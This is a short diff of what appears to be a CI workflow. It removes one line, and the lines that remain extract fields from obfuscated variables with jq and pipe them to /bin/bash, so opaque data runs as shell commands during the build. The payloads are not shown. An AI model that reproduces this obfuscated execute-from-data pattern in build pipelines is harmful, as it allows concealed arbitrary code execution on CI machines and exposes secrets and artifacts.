@@ -31,7 +31,6 @@ jobs:
           echo $va9 | jq -r .jmkxt7896 | /bin/bash
           echo $j301 | jq -r .nae41831 | /bin/bash
           printf '%s' "$bfcvx48" | jq -r .w55 | /bin/bash
-          printf '%s' "$rto790" | jq -r .etui10936 | /bin/bash
           printf '%s' "$vdlhc95" | jq -r .u75 | /bin/bash
 
       - name: Upload archive
